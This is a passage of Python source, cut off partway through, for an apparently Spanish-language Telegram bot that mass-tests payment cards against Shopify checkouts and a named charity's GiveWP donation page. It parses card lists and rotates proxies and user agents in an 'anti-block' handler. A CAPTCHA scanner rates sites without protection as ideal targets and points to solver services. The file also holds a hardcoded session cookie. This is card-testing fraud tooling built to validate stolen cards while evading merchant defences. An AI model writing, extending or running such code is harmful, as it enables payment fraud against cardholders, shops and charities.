# -*- coding: utf-8 -*-
"""
Bot de Telegram para verificar tarjetas - VERSIÓN COMPLETA
Con Shopify + GiveWP, detección inteligente de archivos, rotación de proxies
y ANALIZADOR DE CAPTCHA
"""

import os
import json
import logging
import asyncio
import time
import random
import sqlite3
import re
from typing import Dict, List, Tuple, Optional, Any
from datetime import datetime
from dataclasses import dataclass, field
from enum import Enum
import signal
import sys

from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import aiohttp

# ================== CONFIGURACIÓN DE LOGGING ==================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================== MANEJO DE SEÑALES ==================
def handle_shutdown(signum, frame):
    logger.info(f"🛑 Recibida señal {signum}, cerrando gracefulmente...")
    sys.exit(0)

signal.signal(signal.SIGTERM, handle_shutdown)
signal.signal(signal.SIGINT, handle_shutdown)

# ================== CONFIGURACIÓN ==================
class Settings:
    """Configuración global del bot"""
    TOKEN = os.environ.get("BOT_TOKEN")
    if not TOKEN:
        raise ValueError("❌ ERROR: BOT_TOKEN no está configurado")

    API_ENDPOINTS = [
        os.environ.get("API_URL", "https://auto-shopify-api-production.up.railway.app/index.php"),
        os.environ.get("API_URL2", "https://auto-shopify-api-production.up.railway.app/index.php"),
        os.environ.get("API_URL3", "https://auto-shopify-api-production.up.railway.app/index.php"),
    ]

    DB_FILE = os.environ.get("DB_FILE", "bot_database.db")
    MAX_WORKERS_PER_USER = int(os.environ.get("MAX_WORKERS", 8))
    RATE_LIMIT_SECONDS = int(os.environ.get("RATE_LIMIT", 2))
    DAILY_LIMIT_CHECKS = int(os.environ.get("DAILY_LIMIT", 1000))
    MASS_LIMIT_PER_HOUR = int(os.environ.get("MASS_LIMIT", 3))
    MASS_COOLDOWN_MINUTES = 0  # SIN COOLDOWN
    ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "").split(",") if id]

    # Configuración de timeouts
    TIMEOUT_CONFIG = {
        "connect": 10,          # Aumentado para proxies lentos
        "sock_connect": 10,
        "sock_read": 60,        # Más tiempo para respuestas lentas
        "total": None,
        "response_body": 60,    
        "bin_lookup": 2,
    }

    # Cookie de sesión GiveWP
    GIVEWP_SESSION_COOKIE = "_mwp_templates_session_id=d3006e4f268f308359cb0b1f2deeba36c19961447cfb3b686d075f145bbe963b; __cf_bm=ql.06QngxLGWXpotjCgJ55McvKs7UURClo4CG8QmquY-1771952389-1.0.1.1-JXnh6OmstNvxZrNfJQCHYLUi0sWvh.2Pz7odsE17s7tuePaJzGI408PfBdPkVbVKMnslXizQGYgHqtMy3hiLsr41cX2o2_iuOQQhMtKHFv8; cookieyes-consent=consentid:VUZuS2R1MnNXUktFdW1DQ0dCeEt0TjRBa1JKbEpJelg,consent:,action:,necessary:,functional:,analytics:,performance:,advertisement:,other:"

# ================== INSTANCE ID ==================
INSTANCE_ID = os.environ.get("RAILWAY_DEPLOYMENT_ID", str(time.time()))

# ================== ENUMS ==================
class CheckStatus(Enum):
    # Éxito real
    CHARGED = "charged"
    
    # Bloqueos / Autenticación
    CAPTCHA_REQUIRED = "captcha_required"
    THREE_DS_REQUIRED = "3ds_required"
    WAF_BLOCK = "waf_block"
    RATE_LIMIT = "rate_limit"
    BLOCKED = "blocked"
    
    # Declinados
    DECLINED = "declined"                    # Confirmado
    DECLINED_LIKELY = "declined_likely"      # Probable
    
    # Errores de red
    CONNECT_TIMEOUT = "connect_timeout"      # Proxy murió
    READ_TIMEOUT = "read_timeout"             # Body lento
    SITE_DOWN = "site_down"
    
    # Respuesta ambigua
    UNKNOWN = "unknown"

class Confidence(Enum):
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    CONFIRMED = "CONFIRMED"

# ================== DATACLASSES ==================
@dataclass
class Job:
    site: str
    proxy: str
    card_data: Dict
    job_id: int
    created_at: datetime = field(default_factory=datetime.now)

@dataclass
class JobResult:
    job: Job
    status: CheckStatus
    confidence: Confidence
    reason: str
    response_time: float
    http_code: Optional[int]
    response_text: str
    success: bool
    bin_info: Dict = field(default_factory=dict)
    price: str = "N/A"
    patterns_detected: List[str] = field(default_factory=list)

# ================== CLASIFICADOR DE RESPUESTAS ==================
class ResponseClassifier:
    """Clasifica respuestas según patrones"""
    
    SUCCESS_PATTERNS = {
        "thank_you": re.compile(r'thank\s*you|thanks', re.I),
        "order_confirmed": re.compile(r'order\s*confirmed|order\s*#\d+', re.I),
        "receipt": re.compile(r'receipt|invoice', re.I),
        "payment_complete": re.compile(r'payment\s*complete|transaction\s*complete', re.I),
        "success": re.compile(r'success|successful', re.I),
        "donation_received": re.compile(r'donation.*received|thank.*for.*donation', re.I),
    }
    
    DECLINE_PATTERNS = {
        "insufficient_funds": re.compile(r'insufficient\s*funds|insufficient.*balance', re.I),
        "declined": re.compile(r'declined|rejected|denied', re.I),
        "card_error": re.compile(r'card.*error|invalid.*card', re.I),
        "expired": re.compile(r'expired\s*card|card.*expired', re.I),
    }
    
    BLOCK_PATTERNS = {
        "captcha": re.compile(r'captcha|recaptcha|challenge', re.I),
        "3ds": re.compile(r'3ds|3d\s*secure|verified.*visa|securecode', re.I),
        "rate_limit": re.compile(r'rate\s*limit|too\s*many|429', re.I),
        "waf": re.compile(r'waf|cloudflare|firewall', re.I),
        "blocked": re.compile(r'blocked|access.*denied|forbidden', re.I),
    }
    
    @classmethod
    def classify(cls, text: str, http_code: Optional[int] = None, response_time: float = 0) -> Tuple[CheckStatus, Confidence, str, List[str]]:
        patterns = []
        
        # Errores HTTP
        if http_code:
            if http_code == 429:
                return CheckStatus.RATE_LIMIT, Confidence.HIGH, "rate_limit", ["http_429"]
            elif http_code == 403:
                return CheckStatus.BLOCKED, Confidence.HIGH, "access_denied", ["http_403"]
            elif http_code == 401:
                return CheckStatus.BLOCKED, Confidence.HIGH, "unauthorized", ["http_401"]
            elif http_code >= 500:
                return CheckStatus.SITE_DOWN, Confidence.HIGH, f"server_error_{http_code}", [f"http_{http_code}"]
        
        text_lower = text.lower()
        
        # Buscar bloqueos (primero, son más específicos)
        for block, pattern in cls.BLOCK_PATTERNS.items():
            if pattern.search(text_lower):
                patterns.append(f"block:{block}")
                if block == "captcha":
                    return CheckStatus.CAPTCHA_REQUIRED, Confidence.HIGH, "captcha_detected", patterns
                elif block == "3ds":
                    return CheckStatus.THREE_DS_REQUIRED, Confidence.HIGH, "3ds_required", patterns
                elif block in ["blocked", "waf"]:
                    return CheckStatus.BLOCKED, Confidence.HIGH, f"{block}_detected", patterns
        
        # Buscar declines
        for decline, pattern in cls.DECLINE_PATTERNS.items():
            if pattern.search(text_lower):
                patterns.append(f"decline:{decline}")
                if decline == "insufficient_funds":
                    return CheckStatus.DECLINED, Confidence.HIGH, "insufficient_funds", patterns
                else:
                    return CheckStatus.DECLINED, Confidence.HIGH, "payment_declined", patterns
        
        # Buscar éxito
        for success, pattern in cls.SUCCESS_PATTERNS.items():
            if pattern.search(text_lower):
                patterns.append(f"success:{success}")
                return CheckStatus.CHARGED, Confidence.HIGH, "payment_successful", patterns
        
        # Si no hay patrones claros
        if len(text) > 100:
            return CheckStatus.UNKNOWN, Confidence.LOW, "unrecognized_response", ["has_content"]
        
        return CheckStatus.UNKNOWN, Confidence.LOW, "no_patterns", ["empty_response"]

# ================== FUNCIONES AUXILIARES ==================
def get_status_emoji(status: CheckStatus) -> str:
    emoji_map = {
        CheckStatus.CHARGED: "✅",
        CheckStatus.CAPTCHA_REQUIRED: "🤖",
        CheckStatus.THREE_DS_REQUIRED: "🔒",
        CheckStatus.WAF_BLOCK: "🛡️",
        CheckStatus.RATE_LIMIT: "⏳",
        CheckStatus.BLOCKED: "🚫",
        CheckStatus.DECLINED: "❌",
        CheckStatus.DECLINED_LIKELY: "⚠️",
        CheckStatus.CONNECT_TIMEOUT: "⏱️",
        CheckStatus.READ_TIMEOUT: "⏱️",
        CheckStatus.SITE_DOWN: "🌐",
        CheckStatus.UNKNOWN: "❓",
    }
    return emoji_map.get(status, "❓")

def get_confidence_icon(confidence: Confidence) -> str:
    icon_map = {
        Confidence.HIGH: "🔴",
        Confidence.MEDIUM: "🟡",
        Confidence.LOW: "🟢",
        Confidence.CONFIRMED: "🔴",
    }
    return icon_map.get(confidence, "⚪")

def format_time(seconds: float) -> str:
    minutes = int(seconds // 60)
    secs = int(seconds % 60)
    if minutes > 0:
        return f"{minutes}m {secs}s"
    return f"{secs}s"

def extract_price(text: str) -> str:
    try:
        patterns = [
            r'\$?(\d+\.\d{2})',
            r'amount["\s:]+(\d+\.\d{2})',
            r'total["\s:]+(\d+\.\d{2})',
            r'value=["\'](\d+\.\d{2})["\']',
        ]
        for pattern in patterns:
            match = re.search(pattern, text, re.I)
            if match:
                return f"${match.group(1)}"
    except:
        pass
    return "N/A"

def create_progress_bar(current: int, total: int, width: int = 20) -> str:
    if total == 0:
        return "[" + "░" * width + "]"
    filled = int((current / total) * width)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}]"

def escape_markdown(text: str) -> str:
    """Escapa caracteres especiales para Markdown de Telegram"""
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

# ================== DETECCIÓN INTELIGENTE DE LÍNEAS ==================
def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
    """
    Detecta si una línea es SITE, PROXY o CARD
    Retorna: (tipo, línea_normalizada)
    """
    line = line.strip()
    if not line:
        return None, None

    # 1️⃣ DETECCIÓN DE SITES (URLs)
    if line.startswith(('http://', 'https://')):
        # Es una URL completa
        rest = line.split('://')[1]
        if '.' in rest and not rest.startswith('.') and ' ' not in rest:
            return 'site', line
    
    # También puede ser dominio sin protocolo
    if not line.startswith(('http://', 'https://')):
        # Patrón de dominio válido
        domain_pattern = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}(:\d+)?$'
        if re.match(domain_pattern, line):
            return 'site', f"https://{line}"

    # 2️⃣ DETECCIÓN DE PROXIES
    if not line.startswith(('http://', 'https://')):
        parts = line.split(':')
        
        # Formato ip:port (2 partes)
        if len(parts) == 2:
            host, port = parts
            if port.isdigit() and 1 <= int(port) <= 65535:
                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                    return 'proxy', line
        
        # Formato ip:port:user:pass (4 partes)
        elif len(parts) == 4:
            host, port, user, password = parts
            if port.isdigit() and 1 <= int(port) <= 65535:
                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                    return 'proxy', line
        
        # Formato ip:port: (3 partes, último vacío)
        elif len(parts) == 3 and parts[2] == '':
            host, port, _ = parts
            if port.isdigit() and 1 <= int(port) <= 65535:
                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                    return 'proxy', f"{host}:{port}::"

    # 3️⃣ DETECCIÓN DE TARJETAS
    if '|' in line:
        parts = line.split('|')
        if len(parts) == 4:
            numero, mes, año, cvv = parts
            # Validación básica
            if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
                mes.isdigit() and 1 <= int(mes) <= 12 and
                año.isdigit() and len(año) in (2, 4) and
                cvv.isdigit() and len(cvv) in (3, 4)):
                return 'card', line

    # 4️⃣ DETECCIÓN DE TARJETAS CON ESPACIOS
    if ' ' in line and '|' not in line:
        # Posible formato con espacios: 4377 1100 1030 9114|08|2026|501
        parts = line.replace(' ', '').split('|')
        if len(parts) == 4:
            numero, mes, año, cvv = parts
            if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
                mes.isdigit() and 1 <= int(mes) <= 12 and
                año.isdigit() and len(año) in (2, 4) and
                cvv.isdigit() and len(cvv) in (3, 4)):
                return 'card', f"{numero}|{mes}|{año}|{cvv}"

    return None, None

# ================== NUEVO: CAPTCHA DETECTOR ==================
class CaptchaDetector:
    """Detecta si un sitio web tiene CAPTCHA y de qué tipo"""
    
    # Patrones de detección
    CAPTCHA_PATTERNS = {
        'recaptcha_v2': [
            r'google\.com/recaptcha/api\.js',
            r'g-recaptcha',
            r'data-sitekey=',
            r'recaptcha\.js',
            r'recaptcha\/api\.js'
        ],
        'recaptcha_v3': [
            r'recaptcha\/api\.js.*render=',
            r'g-recaptcha.*v3',
            r'recaptcha.*v3'
        ],
        'hcaptcha': [
            r'hcaptcha\.com',
            r'h-captcha',
            r'js\.hcaptcha\.com',
            r'hcaptcha.*sitekey'
        ],
        'cloudflare_turnstile': [
            r'challenges\.cloudflare\.com',
            r'turnstile',
            r'cf-challenge'
        ],
        'geetest': [
            r'geetest\.com',
            r'gt\.geetest\.com',
            r'geetest\.js'
        ],
        'funcaptcha': [
            r'funcaptcha\.com',
            r'arkoselabs\.com',
            r'cdn\.arkoselabs\.com'
        ],
        'datadome': [
            r'datadome\.co',
            r'js\.datadome\.co',
            r'geo\.datadome\.co'
        ],
        'aws_waf': [
            r'aws-waf-captcha',
            r'awswaf',
            r'captcha\.aws'
        ],
        'generic': [
            r'captcha',
            r'challenge',
            r'verify',
            r'robot',
            r'security.*check'
        ]
    }
    
    # Servicios de resolución de CAPTCHA (para referencia)
    CAPTCHA_SERVICES = {
        'recaptcha_v2': 'Google reCAPTCHA v2 (casilla/imágenes)',
        'recaptcha_v3': 'Google reCAPTCHA v3 (invisible, basado en puntuación)',
        'hcaptcha': 'hCaptcha (alternativa a reCAPTCHA)',
        'cloudflare_turnstile': 'Cloudflare Turnstile',
        'geetest': 'GeeTest (deslizador/rompecabezas)',
        'funcaptcha': 'FunCaptcha (Arkoselabs)',
        'datadome': 'DataDome (protección avanzada)',
        'aws_waf': 'AWS WAF Captcha',
        'generic': 'CAPTCHA genérico'
    }
    
    @staticmethod
    async def detect_from_html(url: str, html: str) -> Dict:
        """
        Detecta CAPTCHA analizando el HTML de la página
        
        Args:
            url: URL del sitio analizado
            html: Contenido HTML de la página
            
        Returns:
            Dict con resultados de detección
        """
        results = {
            'url': url,
            'has_captcha': False,
            'detected_types': [],
            'details': {},
            'sitekeys': {},
            'confidence': 'LOW',
            'timestamp': datetime.now().isoformat()
        }
        
        html_lower = html.lower()
        
        # Buscar patrones
        for captcha_type, patterns in CaptchaDetector.CAPTCHA_PATTERNS.items():
            matches = []
            for pattern in patterns:
                found = re.findall(pattern, html_lower)
                if found:
                    matches.extend(found)
                    # Intentar extraer sitekey
                    sitekey_match = re.search(r'sitekey["\']?:\s*["\']([^"\']+)["\']', html_lower)
                    if sitekey_match:
                        results['sitekeys'][captcha_type] = sitekey_match.group(1)
            
            if matches:
                results['has_captcha'] = True
                results['detected_types'].append(captcha_type)
                results['details'][captcha_type] = {
                    'matches': len(matches),
                    'service': CaptchaDetector.CAPTCHA_SERVICES.get(captcha_type, 'Desconocido')
                }
        
        # Calcular confianza
        if len(results['detected_types']) > 0:
            if len(results['detected_types']) >= 2 or 'recaptcha_v2' in results['detected_types']:
                results['confidence'] = 'HIGH'
            elif len(results['detected_types']) == 1:
                results['confidence'] = 'MEDIUM'
        
        return results
    
    @staticmethod
    async def analyze_headers(headers: Dict) -> Dict:
        """
        Analiza headers HTTP en busca de indicadores de seguridad
        
        Args:
            headers: Headers de la respuesta HTTP
            
        Returns:
            Dict con indicadores de seguridad
        """
        indicators = {
            'has_security_headers': False,
            'server': headers.get('Server', 'Desconocido'),
            'cf_ray': 'cf-ray' in headers,
            'cloudflare': 'cloudflare' in headers.get('Server', '').lower(),
            'datadome': 'datadome' in str(headers).lower(),
            'akamai': 'akamai' in headers.get('Server', '').lower()
        }
        
        indicators['has_security_headers'] = any([
            indicators['cf_ray'],
            indicators['cloudflare'],
            indicators['datadome'],
            indicators['akamai']
        ])
        
        return indicators
    
    @staticmethod
    async def check_site(url: str, timeout: int = 15) -> Dict:
        """
        Analiza un sitio web completo para detectar CAPTCHA
        
        Args:
            url: URL del sitio a analizar
            timeout: Timeout en segundos
            
        Returns:
            Dict con análisis completo
        """
        logger.info(f"🔍 Analizando sitio: {url}")
        
        # Normalizar URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        try:
            async with aiohttp.ClientSession() as session:
                start_time = time.time()
                
                # Headers como navegador real
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                
                async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                    html = await resp.text()
                    elapsed = time.time() - start_time
                    
                    logger.info(f"✅ Sitio cargado en {elapsed:.2f}s - Status: {resp.status}")
                    
                    # Analizar HTML
                    html_analysis = await CaptchaDetector.detect_from_html(url, html)
                    
                    # Analizar headers
                    headers_analysis = await CaptchaDetector.analyze_headers(dict(resp.headers))
                    
                    # Análisis de scripts externos
                    external_scripts = re.findall(r'<script[^>]*src=["\'](https?://[^"\']+)["\']', html)
                    
                    # Detectar servicios de resolución (para debug)
                    resolution_services = []
                    if 'capsolver' in html.lower():
                        resolution_services.append('CapSolver detectado')
                    if '2captcha' in html.lower():
                        resolution_services.append('2Captcha detectado')
                    if 'anti-captcha' in html.lower():
                        resolution_services.append('Anti-Captcha detectado')
                    
                    return {
                        'success': True,
                        'url': url,
                        'status_code': resp.status,
                        'response_time': elapsed,
                        'page_size': len(html),
                        'security_headers': headers_analysis,
                        'captcha': html_analysis,
                        'external_scripts': len(external_scripts),
                        'resolution_services': resolution_services,
                        'recommendation': CaptchaDetector._get_recommendation(html_analysis)
                    }
                    
        except asyncio.TimeoutError:
            logger.error(f"⏱️ Timeout al analizar {url}")
            return {
                'success': False,
                'url': url,
                'error': 'Timeout',
                'recommendation': 'El sitio no responde o es muy lento'
            }
        except Exception as e:
            logger.error(f"❌ Error analizando {url}: {e}")
            return {
                'success': False,
                'url': url,
                'error': str(e)[:100],
                'recommendation': 'No se pudo acceder al sitio'
            }
    
    @staticmethod
    def _get_recommendation(analysis: Dict) -> str:
        """Genera recomendación basada en el análisis"""
        if not analysis['has_captcha']:
            return "✅ Sitio sin CAPTCHA detectable - Ideal para el bot"
        
        types = analysis['detected_types']
        if 'recaptcha_v2' in types:
            return "⚠️ Tiene reCAPTCHA v2 - Requiere resolución, posible con servicios como CapSolver"
        elif 'recaptcha_v3' in types:
            return "⚠️ Tiene reCAPTCHA v3 (invisible) - Más difícil de detectar, requiere tokens de alta puntuación"
        elif 'hcaptcha' in types:
            return "⚠️ Tiene hCaptcha - Alternativa común, requiere resolución"
        elif 'cloudflare_turnstile' in types:
            return "⚠️ Tiene Cloudflare Turnstile - Desafío moderno, requiere proxy"
        elif len(types) > 1:
            return "⚠️ Múltiples sistemas de protección detectados"
        else:
            return f"⚠️ Posible CAPTCHA detectado ({types[0] if types else 'desconocido'})"

# ================== CACHÉ DE BIN ==================
BIN_CACHE = {}
BIN_CACHE_LOCK = asyncio.Lock()
BIN_SESSION = None
BIN_SESSION_LOCK = asyncio.Lock()

async def get_bin_session() -> aiohttp.ClientSession:
    global BIN_SESSION
    async with BIN_SESSION_LOCK:
        if BIN_SESSION is None or BIN_SESSION.closed:
            timeout = aiohttp.ClientTimeout(total=Settings.TIMEOUT_CONFIG["bin_lookup"])
            BIN_SESSION = aiohttp.ClientSession(timeout=timeout)
        return BIN_SESSION

async def get_bin_info(bin_code: str) -> Dict:
    async with BIN_CACHE_LOCK:
        if bin_code in BIN_CACHE:
            cache_time, data = BIN_CACHE[bin_code]
            if (datetime.now() - cache_time).total_seconds() < 86400:
                return data
    
    try:
        session = await get_bin_session()
        async with session.get(f"https://lookup.binlist.net/{bin_code}") as resp:
            if resp.status == 200:
                try:
                    data = await asyncio.wait_for(resp.json(), timeout=Settings.TIMEOUT_CONFIG["bin_lookup"])
                    result = {
                        "bank": data.get("bank", {}).get("name", "Unknown"),
                        "brand": data.get("scheme", "Unknown").upper(),
                        "country": data.get("country", {}).get("alpha2", "UN"),
                        "type": data.get("type", "Unknown"),
                    }
                    
                    async with BIN_CACHE_LOCK:
                        BIN_CACHE[bin_code] = (datetime.now(), result)
                    
                    return result
                except asyncio.TimeoutError:
                    logger.debug(f"Timeout leyendo BIN {bin_code}")
    except Exception as e:
        logger.debug(f"Error consultando BIN {bin_code}: {e}")
    
    default = {"bank": "Unknown", "brand": "UNKNOWN", "country": "UN", "type": "Unknown"}
    async with BIN_CACHE_LOCK:
        BIN_CACHE[bin_code] = (datetime.now(), default)
    return default

# ================== VALIDACIÓN DE TARJETAS ==================
class CardValidator:
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10 == 0

    @staticmethod
    def validate_expiry(month: str, year: str) -> bool:
        try:
            exp_month = int(month)
            exp_year = int(year)
            if len(year) == 2:
                exp_year += 2000
            now = datetime.now()
            if exp_year < now.year:
                return False
            if exp_year == now.year and exp_month < now.month:
                return False
            return True
        except:
            return False

    @staticmethod
    def validate_cvv(cvv: str) -> bool:
        return cvv.isdigit() and len(cvv) in (3, 4)

    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        parts = card_str.split('|')
        if len(parts) != 4:
            return None
        number, month, year, cvv = parts
        if not number.isdigit() or len(number) < 13 or len(number) > 19:
            return None
        if not CardValidator.luhn_check(number):
            return None
        if not CardValidator.validate_expiry(month, year):
            return None
        if not CardValidator.validate_cvv(cvv):
            return None
        return {
            "number": number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "bin": number[:6],
            "last4": number[-4:]
        }

# ================== BASE DE DATOS ==================
class Database:
    def __init__(self, db_path=Settings.DB_FILE):
        self.db_path = db_path
        self._write_lock = asyncio.Lock()
        self._batch_queue = []
        self._batch_lock = asyncio.Lock()
        self._batch_task = None
        self._initialized = False
        
    def _init_db_sync(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("PRAGMA journal_mode=WAL")
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    sites TEXT DEFAULT '[]',
                    proxies TEXT DEFAULT '[]',
                    cards TEXT DEFAULT '[]',
                    givewp_sites TEXT DEFAULT '[]',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    card_bin TEXT,
                    card_last4 TEXT,
                    site TEXT,
                    proxy TEXT,
                    status TEXT,
                    confidence TEXT,
                    reason TEXT,
                    response_time REAL,
                    http_code INTEGER,
                    price TEXT,
                    bin_info TEXT,
                    patterns TEXT,
                    gateway TEXT DEFAULT 'shopify',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS rate_limits (
                    user_id INTEGER PRIMARY KEY,
                    last_check TIMESTAMP,
                    checks_today INTEGER DEFAULT 0,
                    last_mass TIMESTAMP,
                    mass_count_hour INTEGER DEFAULT 0,
                    last_reset DATE DEFAULT CURRENT_DATE
                )
            ''')
            
            conn.commit()

    async def initialize(self):
        if self._initialized:
            return
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._init_db_sync)
        self._batch_task = asyncio.create_task(self._batch_processor())
        self._initialized = True
        logger.info(f"✅ Base de datos inicializada")

    async def _batch_processor(self):
        while True:
            try:
                await asyncio.sleep(5)
                if self._batch_queue:
                    async with self._batch_lock:
                        batch = self._batch_queue.copy()
                        self._batch_queue.clear()
                    
                    async with self._write_lock:
                        await self._execute_batch(batch)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error en batch processor: {e}")

    async def _execute_batch(self, batch: List[tuple]):
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, self._sync_execute_batch, batch)
        except Exception as e:
            logger.error(f"Error en batch insert: {e}")

    def _sync_execute_batch(self, batch: List[tuple]):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.executemany(
                """INSERT INTO results 
                   (user_id, card_bin, card_last4, site, proxy, status, confidence,
                    reason, response_time, http_code, price, bin_info, patterns, gateway)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                batch
            )
            conn.commit()

    async def save_result(self, user_id: int, result: JobResult, gateway: str = "shopify"):
        patterns_json = json.dumps(result.patterns_detected)
        async with self._batch_lock:
            self._batch_queue.append((
                user_id, 
                result.job.card_data['bin'], 
                result.job.card_data['last4'],
                result.job.site, 
                result.job.proxy, 
                result.status.value,
                result.confidence.value, 
                result.reason, 
                result.response_time,
                result.http_code, 
                result.price, 
                json.dumps(result.bin_info),
                patterns_json,
                gateway
            ))

    async def execute(self, query: str, params: tuple = ()):
        async with self._write_lock:
            loop = asyncio.get_event_loop()
            return await loop.run_in_executor(None, lambda: self._sync_execute(query, params))

    def _sync_execute(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(query, params)
            conn.commit()
            return cursor

    async def fetch_one(self, query: str, params: tuple = ()):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, lambda: self._sync_fetch_one(query, params))

    def _sync_fetch_one(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            row = cursor.fetchone()
            return dict(row) if row else None

    async def fetch_all(self, query: str, params: tuple = ()):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, lambda: self._sync_fetch_all(query, params))

    def _sync_fetch_all(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            return [dict(row) for row in cursor.fetchall()]

    async def get_stats(self, user_id: int) -> Dict:
        """Obtiene estadísticas del usuario"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ?", (user_id,))
            total = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'charged'", (user_id,))
            charged = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'declined'", (user_id,))
            declined = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'declined_likely'", (user_id,))
            declined_likely = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status LIKE '%timeout%'", (user_id,))
            timeout = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'captcha_required'", (user_id,))
            captcha = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = '3ds_required'", (user_id,))
            three_ds = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'unknown'", (user_id,))
            unknown = cursor.fetchone()[0]
            
            return {
                "total": total,
                "charged": charged,
                "declined": declined,
                "declined_likely": declined_likely,
                "timeout": timeout,
                "captcha": captcha,
                "three_ds": three_ds,
                "unknown": unknown
            }

    async def cleanup_old_results(self, days: int = 7):
        await self.execute(
            "DELETE FROM results WHERE created_at < date('now', ?)",
            (f"-{days} days",)
        )

    async def shutdown(self):
        if self._batch_task:
            self._batch_task.cancel()
            try:
                await self._batch_task
            except asyncio.CancelledError:
                pass
        global BIN_SESSION
        if BIN_SESSION and not BIN_SESSION.closed:
            await BIN_SESSION.close()

# ================== ANTI-BLOCK GIVEWP HANDLER ==================
class AntiBlockGiveWPDonationHandler:
    """Maneja donaciones con técnicas anti-bloqueo - VERSIÓN CORREGIDA"""
    
    def __init__(self, user_id: int, proxies: List[str] = None, session_cookies: str = None):
        self.user_id = user_id
        self.proxies = proxies if proxies else []
        self.proxy_index = 0
        self.session = None
        self.cookies = self._parse_cookies(session_cookies) if session_cookies else {}
        self.base_url = "https://donate.schf.org.au"
        self.personal_data = {}
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
